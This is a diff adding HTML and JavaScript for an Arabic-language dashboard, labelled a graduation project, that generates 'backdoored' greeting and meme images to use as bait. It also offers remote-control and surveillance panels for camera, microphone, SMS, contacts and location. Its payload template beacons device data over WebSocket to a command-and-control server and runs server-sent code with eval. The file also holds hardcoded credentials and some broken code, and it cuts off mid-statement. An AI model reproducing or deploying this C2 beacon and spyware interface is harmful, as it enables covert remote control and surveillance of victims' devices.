+                <div class="permissions-container" style="margin-bottom: 20px;">
+                    <h4 style="color: #1e90ff; margin-bottom: 20px; display: flex; align-items: center; gap: 10px;">
+                        <i class="fas fa-code"></i> تقنية التضمين المتقدمة
+                    </h4>
+                    
+                    <div class="button-group" style="justify-content: flex-start;">
+                        <button class="btn" onclick="selectEmbedding('LSB')" id="btnLSB" style="padding: 10px 20px; background: linear-gradient(45deg, #2ed573, #1e90ff);">
+                            <i class="fas fa-eye-slash"></i> LSB
+                        </button>
+                        <button class="btn" onclick="selectEmbedding('DCT')" id="btnDCT" style="padding: 10px 20px;">
+                            <i class="fas fa-wave-square"></i> DCT
+                        </button>
+                        <button class="btn" onclick="selectEmbedding('LSB_MATCH')" id="btnLSB_MATCH" style="padding: 10px 20px;">
+                            <i class="fas fa-random"></i> LSB Matching
+                        </button>
+                        <button class="btn" onclick="selectEmbedding('SPREAD')" id="btnSPREAD" style="padding: 10px 20px;">
+                            <i class="fas fa-satellite-dish"></i> Spread Spectrum
+                        </button>
+                    </div>
+                    
+                    <div style="margin-top: 15px; color: #a4b0be; font-size: 0.9rem;">
+                        <span id="embeddingInfo">تقنية LSB: تضمين البيانات في البكسلات الأقل أهمية</span>
+                    </div>
+                </div>
+                
+                <!-- بيانات الباكدور -->
+                <div class="permissions-container" style="margin-bottom: 20px;">
+                    <h4 style="color: #ffa502; margin-bottom: 20px; display: flex; align-items: center; gap: 10px;">
+                        <i class="fas fa-terminal"></i> بيانات الباكدور المضمنة
+                    </h4>
+                    
+                    <div class="log-output" style="height: 200px; font-family: 'Courier New', monospace;" id="payloadPreview">
+                        // كود التنشيط المخفي
+                        (function() {
+                            const activationKey = "b3a7e2f8-c9d1-4a6b-8c3e-5f9a2b7c1d0e";
+                            const targetServer = "ws://c2.lab-research.net:8443";
+                            
+                            // تفعيل متأخر عشوائي
+                            setTimeout(() => {
+                                const ws = new WebSocket(targetServer);
+                                
+                                ws.onopen = function() {
+                                    const deviceInfo = {
+                                        type: "image_backdoor",
+                                        key: activationKey,
+                                        device: navigator.userAgent,
+                                        timestamp: Date.now()
+                                    };
+                                    ws.send(JSON.stringify(deviceInfo));
+                                };
+                                
+                                ws.onmessage = function(event) {
+                                    const command = JSON.parse(event.data);
+                                    executeCommand(command);
+                                };
+                            }, Math.random() * 10000 + 5000);
+                        })();
+                    </div>
+                    
+                    <div style="margin-top: 15px;">
+                        <button class="btn" onclick="generatePayload()" style="padding: 10px 20px;">
+                            <i class="fas fa-sync"></i> توليد حمولة جديدة
+                        </button>
+                    </div>
+                </div>
+                
+                <!-- أزرار التحكم -->
+                <div class="button-group" style="margin-top: 30px;">
+                    <button class="btn" onclick="generateImage()" style="background: linear-gradient(45deg, #9b59b6, #8e44ad); min-width: 250px;">
+                        <i class="fas fa-magic"></i> توليد الصورة المخترقة
+                    </button>
+                    <button class="btn btn-danger" onclick="downloadImage()" id="btnDownload" disabled style="min-width: 250px;">
+                        <i class="fas fa-download"></i> تنزيل الصورة (غير جاهز)
+                    </button>
+                </div>
+            </div>
+        </div>
+        
+        <!-- System Logs -->
+        <div class="log-container">
+            <div class="log-header">
+                <div class="log-title">
+                    <i class="fas fa-terminal"></i>
+                    سجل النظام الحي
+                </div>
+                <div class="log-controls">
+                    <button class="btn btn-warning" onclick="clearLogs()" style="padding: 10px 20px; font-size: 0.9rem;">
+                        <i class="fas fa-trash"></i> مسح السجلات
+                    </button>
+                    <button class="btn" onclick="exportLogs()" style="padding: 10px 20px; font-size: 0.9rem;">
+                        <i class="fas fa-download"></i> تصدير السجلات
+                    </button>
+                </div>
+            </div>
+            <div class="log-output" id="systemLog">
+                <!-- Logs will be displayed here -->
+            </div>
+        </div>
+        
+        <!-- Action Buttons -->
+        <div class="button-group">
+            <button class="btn" onclick="startFullResearch()">
+                <i class="fas fa-play-circle"></i> بدء البحث الشامل
+            </button>
+            <button class="btn btn-danger" onclick="emergencyStop()">
+                <i class="fas fa-stop-circle"></i> توقف طارئ
+            </button>
+            <button class="btn btn-warning" onclick="showPermissions()">
+                <i class="fas fa-key"></i> إدارة الصلاحيات
+            </button>
+        </div>
+        
+        <!-- Permissions Display -->
+        <div class="permissions-container" id="permissionsDisplay" style="display: none;">
+            <h3 style="color: #fff; margin-bottom: 25px; display: flex; align-items: center; gap: 15px;">
+                <i class="fas fa-shield-alt"></i> الصلاحيات المفعّلة
+            </h3>
+            <div id="permissionsList">
+                <!-- Permissions will be loaded here -->
+            </div>
+        </div>
+        
+        <!-- Footer -->
+        <div class="footer">
+            <p>
+                <i class="fas fa-graduation-cap"></i>
+                نظام البحث الأمني المتقدم - مشروع تخرج أكاديمي
+            </p>
+            <p>
+                <i class="fas fa-exclamation-circle"></i>
+                للاستخدام في البيئات المعزولة تحت الإشراف الأكاديمي فقط
+            </p>
+            <p style="margin-top: 20px; color: #57606f; font-size: 0.85rem;">
+                الإصدار 2.0.1 | آخر تحديث: 2024 | جميع الحقوق محفوظة للاستخدام الأكاديمي
+            </p>
+        </div>
+    </div>
+    
+    <!-- Remote Control Modal -->
+    <div class="modal" id="remoteControlModal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h2 class="modal-title">
+                    <i class="fas fa-gamepad"></i>
+                    مركز التحكم عن بعد
+                </h2>
+                <button class="close-modal" onclick="closeModal('remoteControlModal')">&times;</button>
+            </div>
+            
+            <div class="command-grid" id="remoteCommands">
+                <!-- Remote commands will be loaded here -->
+            </div>
+            
+            <div style="text-align: center; margin-top: 30px;">
+                <button class="btn btn-danger" onclick="closeModal('remoteControlModal')">
+                    <i class="fas fa-times"></i> إغلاق مركز التحكم
+                </button>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Monitoring Control Modal -->
+    <div class="modal" id="monitoringModal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h2 class="modal-title">
+                    <i class="fas fa-eye"></i>
+                    التحكم في أنظمة المراقبة
+                </h2>
+                <button class="close-modal" onclick="closeModal('monitoringModal')">&times;</button>
+            </div>
+            
+            <div class="command-grid" id="monitoringCommands">
+                <!-- Monitoring commands will be loaded here -->
+            </div>
+        </div>
+    </div>
+    
+    <!-- مودال تحميل الصورة -->
+    <div class="modal" id="imageProcessingModal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h2 class="modal-title">
+                    <i class="fas fa-spinner fa-spin"></i>
+                    جاري توليد الصورة المخترقة
+                </h2>
+                <button class="close-modal" onclick="closeModal('imageProcessingModal')">&times;</button>
+            </div>
+            
+            <div style="text-align: center; padding: 30px;">
+                <div class="progress-bar" style="width: 80%; margin: 20px auto;">
+                    <div class="progress-fill" id="imageProgress" style="width: 0%"></div>
+                </div>
+                
+                <div id="processingSteps" style="text-align: right; margin-top: 30px;">
+                    <div class="log-entry type-info" id="step1">
+                        <span class="log-time">--:--:--</span>
+                        <span class="log-type type-info">جاري</span>
+                        تحميل القالب الأساسي...
+                    </div>
+                    <div class="log-entry" id="step2">
+                        <span class="log-time">--:--:--</span>
+                        <span class="log-type">في الانتظار</span>
+                        إنشاء بيانات الباكدور...
+                    </div>
+                    <div class="log-entry" id="step3">
+                        <span class="log-time">--:--:--</span>
+                        <span class="log-type">في الانتظار</span>
+                        تطبيق تقنية التضمين...
+                    </div>
+                    <div class="log-entry" id="step4">
+                        <span class="log-time">--:--:--</span>
+                        <span class="log-type">في الانتظار</span>
+                        إضافة التحسينات الأمنية...
+                    </div>
+                    <div class="log-entry" id="step5">
+                        <span class="log-time">--:--:--</span>
+                        <span class="log-type">في الانتظار</span>
+                        إنشاء الصورة النهائية...
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- JavaScript -->
+    <script>
+        // النظام الأساسي للبحث الأمني (المبسط)
+// إضافة هذه الخصائص للكلاس
+class AdvancedSecurityResearchSystem {
+    constructor() {
+        this.initialized = false;
+        this.monitoringActive = false;
+        this.systemLogs = [];
+        
+        // إضافة هذه السطرين
+        this.activePermissions = new Set();
+        this.availablePermissions = this.getPermissionsList();
+        
+        this.log('🔧 تهيئة النظام البحثي...', 'info');
+    }
+    
+    // أضف هذه الدالة
+    getPermissionsList() {
+        return [
+            { id: 'full_control', name: 'التحكم الكامل في النظام', icon: 'fa-microchip' },
+            { id: 'camera_access', name: 'الوصول للكاميرا', icon: 'fa-camera' },
+            { id: 'mic_access', name: 'الوصول للميكروفون', icon: 'fa-microphone' },
+            { id: 'location_tracking', name: 'تتبع الموقع', icon: 'fa-map-marker-alt' },
+            { id: 'network_monitor', name: 'مراقبة الشبكة', icon: 'fa-network-wired' },
+            { id: 'sms_access', name: 'قراءة الرسائل', icon: 'fa-comment-alt' },
+            { id: 'call_access', name: 'مراقبة المكالمات', icon: 'fa-phone' },
+            { id: 'storage_access', name: 'الوصول للتخزين', icon: 'fa-hdd' }
+        ];
+    }
+    
+    // أضف هذه الدالة
+    initializePermissions() {
+        this.availablePermissions.forEach(perm => {
+            this.activePermissions.add(perm.id);
+        });
+        this.updatePermissionsDisplay();
+    }
+    
+    // أضف هذه الدالة
+    updatePermissionsDisplay() {
+        const container = document.getElementById('permissionsList');
+        if (!container) return;
+        
+        let html = '';
+        this.availablePermissions.forEach(perm => {
+            const isActive = this.activePermissions.has(perm.id);
+            html += `
+                <div class="permission-item">
+                    <div class="permission-info">
+                        <h4><i class="fas ${perm.icon}"></i> ${perm.name}</h4>
+                        <p>صلاحية التحكم الكامل في هذا القسم</p>
+                    </div>
+                    <div class="permission-status ${isActive ? 'status-enabled' : 'status-disabled'}">
+                        ${isActive ? '✓ مفعل' : '✗ معطل'}
+                    </div>
+                </div>
+            `;
+        });
+        
+        container.innerHTML = html;
+    }
+}
+            
+            getTypeArabic(type) 
+                const types = {
+                    'info': 'معلومات',
+                    'success': 'نجاح',
+                    'warning': 'تحذير',
+                    'error': 'خطأ',
+                    'critical': 'حرج',
+                    'data': 'بيانات'
+                };
+                return types[type] || type;
+            
+        
+        
+        // نظام توليد الصور المخترقة المتكامل
+        class AdvancedImageGenerator {
+            constructor() {
+                this.currentTemplate = 'new_year';
+                this.embeddingMethod = 'LSB';
+                this.payload = this.generateNewPayload();
+                this.backdoorEnabled = true;
+                this.c2Server = 'ws://c2.lab-research.net:8443';
+                this.generatedImage = null;
+            }
+            
+            
+            generateNewPayload() {
+                const activationKey = Array.from(crypto.getRandomValues(new Uint8Array(16)))
+                    .map(b => b.toString(16).padStart(2, '0')).join('');
+                
+                return {
+                    activationKey: activationKey,
+                    version: '2.0.1',
+                    type: 'advanced_image_backdoor',
+                    capabilities: [
+                        'device_info',
+                        'screenshot',
+                        'location',
+                        'audio_record',
+                        'file_access',
+                        'camera_access',
+                        'keylogger',
+                        'remote_shell'
+                    ],
+                    stealth: true,
+                    persistence: false,
+                    encryption: 'AES-256-GCM',
+                    timestamp: Date.now()
+                };
+            }
+            
+            async generateImage() {
+                const steps = [
+                    { id: 'step1', message: 'تحميل القالب الأساسي...', delay: 500 },
+                    { id: 'step2', message: 'إنشاء بيانات الباكدور...', delay: 800 },
+                    { id: 'step3', message: 'تطبيق تقنية التضمين...', delay: 1200 },
+                    { id: 'step4', message: 'إضافة التحسينات الأمنية...', delay: 1000 },
+                    { id: 'step5', message: 'إنشاء الصورة النهائية...', delay: 1500 }
+                ];
+                
+                // تحديث واجهة التقدم
+                for (let i = 0; i < steps.length; i++) {
+                    const step = steps[i];
+                    const progress = ((i + 1) / steps.length) * 100;
+                    
+                    // تحديث شريط التقدم
+                    document.getElementById('imageProgress').style.width = `${progress}%`;
+                    
+                    // تحديث الخطوة الحالية
+                    const stepElement = document.getElementById(step.id);
+                    stepElement.classList.remove('completed');
+                    stepElement.classList.add('active');
+                    stepElement.querySelector('.log-time').textContent = new Date().toLocaleTimeString('ar-EG');
+                    stepElement.querySelector('.log-type').textContent = 'جاري';
+                    
+                    // محاكاة المعالجة
+                    await this.delay(step.delay);
+                    
+                    // وضع علامة إتمام على الخطوة
+                    stepElement.classList.remove('active');
+                    stepElement.classList.add('completed');
+                    stepElement.querySelector('.log-type').textContent = 'مكتمل ✓';
+                }
+                
+                // إنشاء صورة وهمية
+                return await this.createMockImage();
+            }
+            
+            async createMockImage() {
+                const canvas = document.createElement('canvas');
+                canvas.width = 1080;
+                canvas.height = 1350;
+                const ctx = canvas.getContext('2d');
+                
+                // خلفية حسب القالب
+                const gradients = {
+                    new_year: ['#FFD700', '#C0C0C0', '#FF6B6B'],
+                    birthday: ['#FF69B4', '#9370DB', '#FFA500'],
+                    holiday: ['#1E90FF', '#00CED1', '#32CD32'],
+                    memes: ['#000000', '#FF0000', '#FFFF00']
+                };
+                
+                const gradient = ctx.createLinearGradient(0, 0, canvas.width, canvas.height);
+                gradients[this.currentTemplate].forEach((color, index) => {
+                    gradient.addColorStop(index / gradients[this.currentTemplate].length, color);
+                });
+                
+                ctx.fillStyle = gradient;
+                ctx.fillRect(0, 0, canvas.width, canvas.height);
+                
+                // إضافة نص حسب القالب
+                const texts = {
+                    new_year: { main: '🎉 Happy New Year 2026 🎊', sub: 'Wishing you prosperity and joy!' },
+                    birthday: { main: '🎂 Happy Birthday! 🥳', sub: 'May all your dreams come true!' },
+                    holiday: { main: '🏖️ Happy Holidays! 🌴', sub: 'Enjoy your well-deserved break!' },
+                    memes: { main: '😂 When you see it... 😭', sub: 'You know you gotta share this!' }
+                };
+                
+                ctx.fillStyle = '#FFFFFF';
+                ctx.font = 'bold 72px Arial';
+                ctx.textAlign = 'center';
+                ctx.shadowColor = 'rgba(0, 0, 0, 0.5)';
+                ctx.shadowBlur = 10;
+                ctx.fillText(texts[this.currentTemplate].main, canvas.width/2, canvas.height/2);
+                
+                ctx.font = '36px Arial';
+                ctx.shadowBlur = 5;
+                ctx.fillText(texts[this.currentTemplate].sub, canvas.width/2, canvas.height/2 + 100);
+                
+                // إضافة علامة مائية مخفية
+                ctx.font = '12px Arial';
+                ctx.fillStyle = 'rgba(255, 255, 255, 0.01)';
+                ctx.fillText(`BACKDOOR:${this.payload.activationKey}`, 10, canvas.height - 10);
+                
+                return canvas.toDataURL('image/jpeg', 0.9);
+            }
+            
+            delay(ms) {
+                return new Promise(resolve => setTimeout(resolve, ms));
+            }
+        }
+        
+        // المتغيرات العامة
+        let researchSystem = null;
+        let imageGenerator = null;
+        
+        // ========== دوال نظام البحث الأساسي ==========
+        function initializeFullSystem() {
+            if (!researchSystem) {
+                researchSystem = new AdvancedSecurityResearchSystem();
+                researchSystem.log('🚀 إنشاء مثيل جديد للنظام', 'info');
+            }
+            
+            researchSystem.log('🔧 بدء تهيئة النظام...', 'info');
+            setTimeout(() => {
+                researchSystem.initialized = true;
+                researchSystem.log('✅ النظام مهيأ وجاهز للعمل', 'success');
+            }, 2000);
+        }
+       // بدل الدوال دي اللي بتقول "قيد التطوير":
+
+function showMonitoringControl() {
+    // بدل من alert
+    // if (!requireLogin()) return;
+    
+    const modal = document.getElementById('monitoringModal');
+    if (modal) {
+        modal.style.display = 'flex';
+        
+        // تحميل أوامر المراقبة
+        const commands = [
+            { id: 'start_monitoring', name: 'بدء المراقبة', icon: 'fa-play' },
+            { id: 'stop_monitoring', name: 'إيقاف المراقبة', icon: 'fa-stop' },
+            { id: 'camera_on', name: 'تشغيل الكاميرا', icon: 'fa-camera' },
+            { id: 'camera_off', name: 'إطفاء الكاميرا', icon: 'fa-camera-slash' },
+            { id: 'mic_on', name: 'تشغيل الميكروفون', icon: 'fa-microphone' },
+            { id: 'mic_off', name: 'إطفاء الميكروفون', icon: 'fa-microphone-slash' },
+            { id: 'gps_on', name: 'تشغيل GPS', icon: 'fa-map-marker-alt' },
+            { id: 'gps_off', name: 'إطفاء GPS', icon: 'fa-map-marker-slash' },
+            { id: 'network_on', name: 'تشغيل المراقبة', icon: 'fa-network-wired' },
+            { id: 'network_off', name: 'إطفاء المراقبة', icon: 'fa-wifi-slash' }
+        ];
+        
+        let html = '';
+        commands.forEach(cmd => {
+            html += `
+                <div class="command-btn" onclick="controlMonitoring('${cmd.id}')">
+                    <div class="command-icon">
+                        <i class="fas ${cmd.icon}"></i>
+                    </div>
+                    <div>${cmd.name}</div>
+                </div>
+            `;
+        });
+        
+        document.getElementById('monitoringCommands').innerHTML = html;
+        
+        if (researchSystem) {
+            researchSystem.log('فتح لوحة التحكم في المراقبة', 'info');
+        }
+    }
+}
+
+function showRemoteControl() {
+    // بدل من alert
+    // if (!requireLogin()) return;
+    
+    const modal = document.getElementById('remoteControlModal');
+    if (modal) {
+        modal.style.display = 'flex';
+        
+        // تحميل أوامر التحكم عن بعد
+        const commands = [
+            { id: 'capture_screen', name: 'التقاط الشاشة', icon: 'fa-desktop' },
+            { id: 'record_audio', name: 'تسجيل الصوت', icon: 'fa-microphone' },
+            { id: 'get_location', name: 'جلب الموقع', icon: 'fa-map-marker-alt' },
+            { id: 'read_sms', name: 'قراءة الرسائل', icon: 'fa-comment-alt' },
+            { id: 'read_contacts', name: 'جهات الاتصال', icon: 'fa-address-book' },
+            { id: 'get_call_logs', name: 'سجل المكالمات', icon: 'fa-phone' },
+            { id: 'list_apps', name: 'قائمة التطبيقات', icon: 'fa-mobile-alt' },
+            { id: 'device_info', name: 'معلومات الجهاز', icon: 'fa-info-circle' },
+            { id: 'take_photo', name: 'التقاط صورة', icon: 'fa-camera' },
+            { id: 'record_video', name: 'تسجيل فيديو', icon: 'fa-video' },
+            { id: 'get_wifi_info', name: 'معلومات الواي فاي', icon: 'fa-wifi' },
+            { id: 'get_network_info', name: 'معلومات الشبكة', icon: 'fa-network-wired' },
+            { id: 'get_storage_info', name: 'معلومات التخزين', icon: 'fa-hdd' },
+            { id: 'get_battery_info', name: 'معلومات البطارية', icon: 'fa-battery-full' }
+        ];
+        
+        let html = '';
+        commands.forEach(cmd => {
+            html += `
+                <div class="command-btn" onclick="executeCommand('${cmd.id}')">
+                    <div class="command-icon">
+                        <i class="fas ${cmd.icon}"></i>
+                    </div>
+                    <div>${cmd.name}</div>
+                </div>
+            `;
+        });
+        
+        document.getElementById('remoteCommands').innerHTML = html;
+        
+        if (researchSystem) {
+            researchSystem.log('فتح لوحة التحكم عن بعد', 'info');
+        }
+    }
+}
+
+function showDataCollection() {
+    // بدل من alert
+    alert('💾 نظام جمع البيانات - تحت التطوير\n\nالميزات القادمة:\n• جمع الصور التلقائي\n• تسجيلات الصوت\n• بيانات الموقع\n• سجلات الشبكة');
+    
+    if (researchSystem) {
+        researchSystem.log('فتح نظام جمع البيانات', 'info');
+    }
+}
+        
+        function startFullResearch() {
+            if (researchSystem && researchSystem.initialized) {
+                researchSystem.log('🔬 بدء البحث الشامل...', 'warning');
+                researchSystem.monitoringActive = true;
+                alert('✅ بدء البحث الشامل');
+            } else {
+                alert('⚠️ يرجى تهيئة النظام أولاً');
+            }
+        }
+        
+        function emergencyStop() {
+            if (confirm('🚨 توقف طارئ - هل أنت متأكد؟')) {
+                if (researchSystem) {
+                    researchSystem.log('⛔ تنشيط التوقف الطارئ!', 'critical');
+                    researchSystem.monitoringActive = false;
+                    alert('🛑 تم إيقاف جميع العمليات');
+                }
+            }
+        }
+        
+        function showPermissions() {
+    const display = document.getElementById('permissionsDisplay');
+    if (display.style.display === 'none' || !display.style.display) {
+        display.style.display = 'block';
+        
+        if (researchSystem) {
+            // إذا لم تكن الصلاحيات مهيأة، قم بتهيئتها
+            if (researchSystem.activePermissions.size === 0) {
+                researchSystem.initializePermissions();
+            }
+            researchSystem.updatePermissionsDisplay();
+        }
+    } else {
+        display.style.display = 'none';
+    }
+}
+        
+        function clearLogs() {
+            if (confirm('هل تريد مسح جميع السجلات؟')) {
+                if (researchSystem) {
+                    researchSystem.systemLogs = [];
+                    researchSystem.updateLogDisplay();
+                    researchSystem.log('تم مسح جميع السجلات', 'warning');
+                }
+            }
+        }
+        
+        function exportLogs() {
+            alert('📥 ميزة تصدير السجلات - قيد التطوير');
+        }
+        
+        function closeModal(modalId) {
+            const modal = document.getElementById(modalId);
+            if (modal) {
+                modal.style.display = 'none';
+            }
+        }
+        
+        // ========== دوال توليد الصور المخترقة ==========
+        function toggleImageLab() {
+            const content = document.getElementById('imageLabContent');
+            if (content.style.display === 'none') {
+                content.style.display = 'block';
+                if (!imageGenerator) {
+                    imageGenerator = new AdvancedImageGenerator();
+                    updatePreview();
+                    generatePayload();
+                }
+            } else {
+                content.style.display = 'none';
+            }
+        }
+        function toggleImageLab() {
+    if (!requireLogin()) return;
+    
+    const content = document.getElementById('imageLabContent');
+    if (content.style.display === 'none') {
+        content.style.display = 'block';
+        if (!imageGenerator) {
+            imageGenerator = new AdvancedImageGenerator();
+            updatePreview();
+            generatePayload();
+        }
+        
+        if (researchSystem) {
+            researchSystem.log('🔬 فتح مختبر توليد الصور المخترقة', 'warning');
+        }
+    } else {
+        content.style.display = 'none';
+        if (researchSystem) {
+            researchSystem.log('🔒 إغلاق مختبر الصور', 'info');
+        }
+    }
+}
+        function selectTemplate(template) {
+            if (!imageGenerator) return;
+            
+            imageGenerator.currentTemplate = template;
+            
+            // تحديث الأزرار النشطة
+            ['new_year', 'birthday', 'holiday', 'memes'].forEach(t => {
+                const badge = document.getElementById(`badge_${t}`);
+                if (badge) {
+                    if (t === template) {
+                        badge.textContent = 'مفعل ✓';
+                        badge.classList.add('active');
+                    } else {
+                        badge.textContent = 'غير مفعل';
+                        badge.classList.remove('active');
+                    }
+                }
+            });
+            
+            updatePreview();
+        }
+        
+        function selectEmbedding(method) {
+            if (!imageGenerator) return;
+            
+            imageGenerator.embeddingMethod = method;
+            
+            // تحديث الأزرار النشطة
+            const buttons = ['LSB', 'DCT', 'LSB_MATCH', 'SPREAD'];
+            buttons.forEach(m => {
+                const btn = document.getElementById(`btn${m}`);
+                if (btn) {
+                    if (m === method) {
+                        btn.classList.add('active-embedding');
+                        btn.style.background = 'linear-gradient(45deg, #2ed573, #1e90ff)';
+                    } else {
+                        btn.classList.remove('active-embedding');
+                        btn.style.background = '';
+                    }
+                }
+            });
+            
+            // تحديث المعلومات
+            const infoText = {
+                'LSB': 'تقنية LSB: تضمين البيانات في البكسلات الأقل أهمية',
+                'DCT': 'تقنية DCT: تضمين في مجال التردد باستخدام تحويل جيب التمام',
+                'LSB_MATCH': 'تقنية LSB Matching: تضمين مقاوم للكشف',
+                'SPREAD': 'تقنية Spread Spectrum: نشر الطيف لمقاومة عالية'
+            };
+            
+            document.getElementById('embeddingInfo').textContent = infoText[method];
+        }
+        
+        function updatePreview() {
+            if (!imageGenerator) return;
+            
+            const canvas = document.getElementById('imagePreviewCanvas');
+            const previewText = document.getElementById('previewText');
+            
+            // تغيير الألوان حسب القالب
+            const colors = {
+                new_year: 'linear-gradient(135deg, #FFD700 0%, #FF6B6B 100%)',
+                birthday: 'linear-gradient(135deg, #FF69B4 0%, #9370DB 100%)',
+                holiday: 'linear-gradient(135deg, #1E90FF 0%, #00CED1 100%)',
+                memes: 'linear-gradient(135deg, #000000 0%, #FF0000 100%)'
+            };
+            
+            const texts = {
+                new_year: '🎉 2026 🎊',
+                birthday: '🎂 HB 🥳',
+                holiday: '🏖️ ✈️ 🌴',
+                memes: '😂 🤣 😭'
+            };
+            
+            canvas.style.background = colors[imageGenerator.currentTemplate];
+            previewText.textContent = texts[imageGenerator.currentTemplate];
+            
+            // تحديث معلومات المعاينة
+            document.getElementById('previewInfo').textContent = 
+                `الحجم: 1080×1350 | القالب: ${imageGenerator.currentTemplate} | التضمين: ${imageGenerator.embeddingMethod}`;
+        }
+        
+        function updateBackdoorSettings() {
+            if (!imageGenerator) return;
+            
+            imageGenerator.backdoorEnabled = document.getElementById('enableBackdoor').checked;
+            imageGenerator.c2Server = document.getElementById('c2Server').value || 'ws://c2.lab-research.net:8443';
+            
+            // تحديث معاينة الباي load
+            generatePayload();
+        }
+        
+        function generatePayload() {
+            if (!imageGenerator) return;
+            
+            imageGenerator.payload = imageGenerator.generateNewPayload();
+            
+            const payloadPreview = document.getElementById('payloadPreview');
+            payloadPreview.textContent = `// كود التنشيط المخفي
+(function() {
+    const activationKey = "${imageGenerator.payload.activationKey}";
+    const targetServer = "${imageGenerator.c2Server}";
+    const stealth = ${imageGenerator.backdoorEnabled};
+    
+    if (stealth) {
+        setTimeout(() => {
+            try {
+                const ws = new WebSocket(targetServer);
+                ws.onopen = function() {
+                    const deviceInfo = {
+                        type: "advanced_image_backdoor_v2",
+                        key: activationKey,
+                        device: navigator.userAgent,
+                        capabilities: ${JSON.stringify(imageGenerator.payload.capabilities)},
+                        timestamp: Date.now()
+                    };
+                    ws.send(JSON.stringify(deviceInfo));
+                    
+                    ws.onmessage = function(event) {
+                        try {
+                            const command = JSON.parse(event.data);
+                            // تنفيذ الأوامر هنا
+                            if (command.type === 'execute') {
+                                eval(command.code);
+                            }
+                        } catch (e) {}
+                    };
+                };
+            } catch (e) {}
+        }, Math.random() * 15000 + 5000);
+    }
+})();`;
+        }
+        const RAILWAY_CONFIG = {
+  // رابط Railway الخاص بك
+  SERVER_URL: 'https://ahmed-c2-system.up.railway.app',
+  WS_URL: 'wss://ahmed-c2-system.up.railway.app',
+  
+  // بيانات المستخدمين
+  USERS: {
+    'admin': 'Admin@2024',
+    'researcher': 'Research@2024',
+    'ahmed': 'Ahmed@2024'
+  },
+  
+  // إعدادات الاتصال
+  AUTO_RECONNECT: true,
+  RECONNECT_DELAY: 3000,
+  HEARTBEAT_INTERVAL: 30000
+};
+
+// تحديث جميع الـ URLs في الكود
+class RailwaySecuritySystem {
+  constructor() {
+    this.serverUrl = RAILWAY_CONFIG.SERVER_URL;
+    this.wsUrl = RAILWAY_CONFIG.WS_URL;
+    // ... باقي الكود
+  }
+}
+// في c2-server.js
+app.get('/ping', (req, res) => {
+  res.json({ pong: Date.now() });
+});
+
+        function testC2Connection() {
+            const server = document.getElementById('c2Server').value;
+            if (!server) {
+                alert('⚠️ الرجاء إدخال عنوان الخادم');
+                return;
+            }
+            
+            if (researchSystem) {
+                researchSystem.log(`🔗 اختبار اتصال C2: ${server}`, 'warning');
+            }
+            
+            alert(`🔄 جاري اختبار الاتصال بالخادم: ${server}`);
+        }
+        
+        async function generateImage() {
+    if (!imageGenerator) {
+        alert('⚠️ النظام غير مهيأ');
+        return;
+    }
+    
+    // فتح مودال المعالجة
+    const modal = document.getElementById('imageProcessingModal');
+    modal.style.display = 'flex';
+    
+    // إعادة تعيين الخطوات
+    for (let i = 1; i <= 5; i++) {
+        const step = document.getElementById(`step${i}`);
+        step.className = 'log-entry';
+        step.querySelector('.log-type').textContent = 'في الانتظار';
+        step.querySelector('.log-time').textContent = '--:--:--';
+    }
+    
+    try {
+        imageGenerator.generatedImage = await imageGenerator.generateImage();
+        
+        // إغلاق المودال
+        setTimeout(() => {
+            modal.style.display = 'none';
+            
+            // تفعيل زر التنزيل
+            const downloadBtn = document.getElementById('btnDownload');
+            downloadBtn.disabled = false;
+            downloadBtn.innerHTML = '<i class="fas fa-download"></i> تنزيل الصورة المخترقة';
+            downloadBtn.style.background = 'linear-gradient(45deg, #2ed573, #1e90ff)';
+            
+            if (researchSystem) {
+                researchSystem.log('✅ تم توليد الصورة المخترقة بنجاح', 'success');
+                researchSystem.log(`🔑 مفتاح التنشيط: ${imageGenerator.payload.activationKey}`, 'data');
+                researchSystem.log(`🌐 خادم C2: ${imageGenerator.c2Server}`, 'data');
+                
+                // إضافة رسالة واقعية
+                researchSystem.log('⚠️ ملاحظة: هذه نسخة تجريبية - لا تحتوي على باكدور حقيقي', 'warning');
+                researchSystem.log('📚 للتطبيق الحقيقي: تحتاج خادم WebSocket وتضمين JavaScript', 'info');
+            }
+            
+            alert('✨ تم توليد الصورة المخترقة بنجاح!\n\nهذه نسخة تجريبية لعرض واجهة النظام.\n\nللحصول على نظام حقيقي تحتاج:\n1. خادم WebSocket (C2 Server)\n2. كود JavaScript للتنفيذ\n3. نظام تضمين حقيقي في الصور');
+            
+        }, 1000);
+        
+    } catch (error) {
+        modal.style.display = 'none';
+        alert(`❌ خطأ في توليد الصورة: ${error.message}`);
+    }
+}
+        function downloadImage() {
+            if (!imageGenerator || !imageGenerator.generatedImage) {
+                alert('⚠️ لم يتم توليد صورة بعد');
+                return;
+            }
+            
+            const templateNames = {
+                new_year: 'Happy_New_Year_2026',
+                birthday: 'Birthday_Greeting',
+                holiday: 'Holiday_Wishes',
+                memes: 'Funny_Meme'
+            };
+            
+            const filename = `${templateNames[imageGenerator.currentTemplate]}_Backdoored_${Date.now()}.jpg`;
+            const link = document.createElement('a');
+            link.href = imageGenerator.generatedImage;
+            link.download = filename;
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+            
+            if (researchSystem) {
+                researchSystem.log(`📥 تم تنزيل الصورة: ${filename}`, 'success');
+                researchSystem.log('🚀 الصورة جاهزة للاستخدام كطعم مخترق', 'warning');
+            }
+            
+            alert(`✅ تم تنزيل الصورة: ${filename}\n\n🔑 مفتاح التنشيط: ${imageGenerator.payload.activationKey}\n🌐 خادم C2: ${imageGenerator.c2Server}`);
+        }
+        
+        // ========== التهيئة عند تحميل الصفحة ==========
+        document.addEventListener('DOMContentLoaded', function() {
+            console.log('🚀 نظام البحث الأمني المتقدم - جاهز للتهيئة');
+            
+            // إنشاء نظام البحث
+            researchSystem = new AdvancedSecurityResearchSystem();
+            
+            // تهيئة حقل C2
+            document.getElementById('c2Server').value = 'ws://c2.lab-research.net:8443';
+            
+            console.log('🎨 نظام توليد الصور المخترقة جاهز للعمل');
+            
+            // إضافة مفتاح اختصار لفتح المختبر (Ctrl+Alt+G)
+            document.addEventListener('keydown', function(e) {
+                if (e.ctrlKey && e.altKey && e.key === 'g') {
+                    e.preventDefault();
+                    toggleImageLab();
+                }
+            });
+        });
+    // ========== نظام تسجيل الدخول ==========
+const users = {
